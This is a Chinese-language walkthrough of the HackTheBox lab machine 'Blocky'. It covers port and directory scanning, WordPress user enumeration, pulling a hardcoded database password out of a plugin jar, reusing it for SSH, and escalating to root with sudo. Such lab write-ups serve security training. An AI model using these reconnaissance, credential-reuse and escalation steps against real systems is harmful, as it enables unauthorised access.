# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测

```
┌──(root💀kali)-[~/htb/Blocky]
└─# nmap -sV -Pn 10.10.10.37 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 22:40 EST
Nmap scan report for 10.10.10.37
Host is up (0.34s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 696.03 seconds


```

开了ftp，ssh，http三个服务

80端口打开是一个wordpress站点

ftp端口貌似存在一个远程执行漏洞
```
┌──(root💀kali)-[~/htb/Blocky]
└─# searchsploit ProFTPD 1.3.5
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                                 | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                                       | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                                                 | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

把36803.py拷贝到当前目录，exp要求一个可写web目录，我们现在还不太清楚哪里是可写的，需要进步一渗透80端口

## 爆破目录
```
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.37                                                                         

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.37/_21-11-29_22-50-04.txt

Error Log: /root/dirsearch/logs/errors-21-11-29_22-50-04.log

Target: http://10.10.10.37/

[22:50:06] Starting:    
[22:51:25] 301 -    0B  - /index.php  ->  http://10.10.10.37/               
[22:51:29] 301 -  315B  - /javascript  ->  http://10.10.10.37/javascript/   
[22:51:32] 200 -   19KB - /license.txt                                      
[22:51:46] 200 -   13KB - /phpmyadmin/doc/html/index.html                   
[22:51:47] 301 -  315B  - /phpmyadmin  ->  http://10.10.10.37/phpmyadmin/   
[22:51:48] 200 -   10KB - /phpmyadmin/                                      
[22:51:48] 301 -  312B  - /plugins  ->  http://10.10.10.37/plugins/         
[22:51:48] 200 -  745B  - /plugins/                                         
[22:51:49] 200 -   10KB - /phpmyadmin/index.php                             
[22:51:51] 200 -    7KB - /readme.html                                                                    
[22:52:11] 200 -  380B  - /wiki/                                            
[22:52:11] 301 -  309B  - /wiki  ->  http://10.10.10.37/wiki/
[22:52:11] 301 -  313B  - /wp-admin  ->  http://10.10.10.37/wp-admin/       
[22:52:11] 200 -    1B  - /wp-admin/admin-ajax.php                          
[22:52:11] 200 -    1KB - /wp-admin/install.php                             
[22:52:11] 500 -    4KB - /wp-admin/setup-config.php                        
[22:52:11] 200 -    0B  - /wp-config.php                                    
[22:52:12] 200 -    0B  - /wp-content/                                      
[22:52:12] 301 -  315B  - /wp-content  ->  http://10.10.10.37/wp-content/   
[22:52:12] 500 -    0B  - /wp-content/plugins/hello.php
[22:52:12] 200 -   69B  - /wp-content/plugins/akismet/akismet.php           
[22:52:12] 200 -    0B  - /wp-cron.php                                      
[22:52:12] 301 -  316B  - /wp-includes  ->  http://10.10.10.37/wp-includes/ 
[22:52:12] 200 -  965B  - /wp-content/uploads/                              
[22:52:12] 500 -    0B  - /wp-includes/rss-functions.php                    
[22:52:12] 200 -    2KB - /wp-login.php                                     
[22:52:12] 302 -    0B  - /wp-signup.php  ->  http://10.10.10.37/wp-login.php?action=register
[22:52:12] 405 -   42B  - /xmlrpc.php                                       
[22:52:13] 200 -   40KB - /wp-includes/  
```
好几个文件夹存在目录遍历漏洞。


用wpsscan枚举用户名
> wpscan --url http://10.10.10.37 --enumerate u1-200

```
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:17 <============================================================================================================================================================> (200 / 200) 100.00% Time: 00:00:17

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

存在一个叫```notch```的用户

用这个用户名爆破wp后台，ftp，ssh,phpmyadmin无果...

# 初始shell

好像走入了死胡同。

于是只好在爆破的目录里看看有什么有用的东西，在```/plugins/```目录里找到两个可以下载的jar文件

把```BlockyCore.class```从```BlockyCore.jar```里分离出来，用strings命令查看
```
┌──(root💀kali)-[~/htb/Blocky]
└─# strings BlockyCore.class 
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
        localhost
root
8YsqfCTnvxAUeduzjNSXe22
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java

```

好像有一个用户凭证：```root:8YsqfCTnvxAUeduzjNSXe22```

但是用来登录ssh和ftp都不行

然后再用上面的用户名```notch```登录，居然登进去了，于是找到我们的初始shell
```
┌──(root💀kali)-[~/htb/Blocky]
└─# ssh notch@10.10.10.37
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$ 

```
在home目录找到user.txt

# 提权

查看sudo特权
```
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

可以使用所有root权限命令。。。

那就很简单了，直接提权到root
```
notch@Blocky:~$ sudo bash -p
root@Blocky:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Blocky:~# whoami
root

```